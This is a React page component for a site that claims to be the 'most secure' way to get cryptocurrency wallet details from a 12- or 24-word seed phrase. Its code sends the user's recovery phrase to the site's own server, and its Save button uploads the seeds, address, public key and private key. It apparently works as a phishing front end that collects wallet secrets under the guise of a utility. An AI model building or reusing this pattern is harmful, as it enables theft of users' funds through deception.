import React from 'react'
import useStore from '../useStore'
import Header from '../components/Header'
import Footer from '../components/Footer'
import { copyToClipboard } from '../util'
import { tips } from '../util'


const Home = () => {
	const [state, setStates] = React.useState({
		value : '',
		address : '',
		publickey : '',
		privatekey : ''
	})

	const {update, loading, call} = useStore()
	const updateStatus = (params : {[key : string] : string | number | boolean | any}) => setStates({ ...state, ...params })

	const save = async () => {
		if(state.address === '' || state.address === null){
			tips("Invalid Address")
			return;
		}
		var res = await call("/api/save-wallet-info", {seeds:state.value, address:state.address, publickey:state.publickey, privatekey:state.privatekey});
		if(res?.error === 0){
			tips("Success: Saved Wallet Info")
		}else {
			tips("Error: Known error")
		}
	}
	const getInfo = async () => {
		var v = state.value.replaceAll("  ", "");
		var arr = v.split(" ");
		if(arr.length != 12 && arr.length != 24){
			tips("Invalid phrase")
			return;
		}
		var res = await call("/api/get-wallet-info", {seeds:v});
		if(res?.error === 0){
			updateStatus({address:"0x"+res['address'], privatekey:res['privatekey'], publickey:res['publickey']})
		}else {
			tips("Error: Known error")
		}
	}
	return (
		<>
			<Header />
			<div className="home">
				<div className="section-1">
					<div className="container">
						<div className="row" >
							<div className="col-5">
								<div style={{marginTop:'200px'}}>
									<h2 className='text-white'>Can Get Wallet Info</h2>
									<h2 className='text-white'>From 12, 24 Seeds</h2>
									<h3 className='text-white'>World Most Secure & Easy Way</h3>
									<br/>
									<a href = "https://t.me" target={"_blank"} className='button-white'>Go To Telegram</a>
								</div>
							</div>
							<div className="col-7">
								<div className="form" style={{marginTop:'100px'}}>
									<h4 className='mt0 mb3'>Security Phrase</h4>
									<input type={"text"} className="w100"  placeholder="Please input 12,24 seeds" value={state.value} onChange={(e)=>{updateStatus({value:e.target.value})}}/>
									<div className="row center mt1">
										<button  className='btn-linear w30 ' onClick={() => {getInfo()}}>Get Info</button>	
									</div>
									<h5>Wallet Address</h5> 
									<textarea  className="w100" rows={1} onClick={()=>{if(state.address !== ''){copyToClipboard(state.address); tips("Copied: address")}}} value={state.address} style={{borderRadius:'10px', cursor:'pointer', margin:0, fontSize:'1.1em'}} readOnly/>
									<h5>Public Key</h5>
									<textarea  className="w100" rows={4} onClick={()=>{if(state.publickey !== ''){copyToClipboard(state.publickey); tips("Copied: publickey")}}} value={state.publickey} style={{borderRadius:'10px', cursor:'pointer', margin:0, fontSize:'1.1em'}} readOnly/>
									<h5 className='p0 mt2'>Private Key</h5>
									<textarea  className="w100" rows={4} onClick={()=>{if(state.privatekey !== ''){copyToClipboard(state.privatekey); tips("Copied: privatekey")}}} value={state.privatekey} style={{borderRadius:'10px', cursor:'pointer', margin:0, fontSize:'1.1em'}} readOnly/>
									<div className="row center">
										<button  className='btn-linear w30' onClick={() => {save()}}>Save</button>	
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<Footer />	
		</>
	)
}

export default Home
